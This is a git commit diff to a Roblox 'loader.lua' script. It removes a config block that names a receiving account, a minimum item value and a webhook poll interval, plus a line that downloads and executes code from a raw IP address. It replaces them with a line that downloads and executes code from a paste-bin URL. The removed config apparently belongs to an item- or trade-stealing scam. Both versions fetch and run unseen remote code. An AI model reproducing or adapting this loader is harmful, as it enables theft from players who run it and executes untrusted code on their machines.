19b4883012f0470d425fab0838b18973fd86d47c
Loodi20 <148504256+Loodi20@users.noreply.github.com>
2026-05-13 13:58:27 +0300

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,12 +1,1 @@
-https://pastefy.app/0FY9sGDC/raw
-
-task.wait(0.2)
-
-local globalEnv = (getgenv and getgenv()) or _G
-globalEnv.StarScriptsConfig = {
-    RECEIVERS = { "Reivy0" },
-    MIN_VALUE = "1k",
-    LINK_ID = "Us8yAHlPiO-aZMu1XxpBN_BuUT5sBnK_",
-    WEBHOOK_POLL_SEC = 2
-}
-loadstring(game:HttpGet("http://205.185.125.84/sab/sabtrade"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/cspjJPz3XJ/0"))()
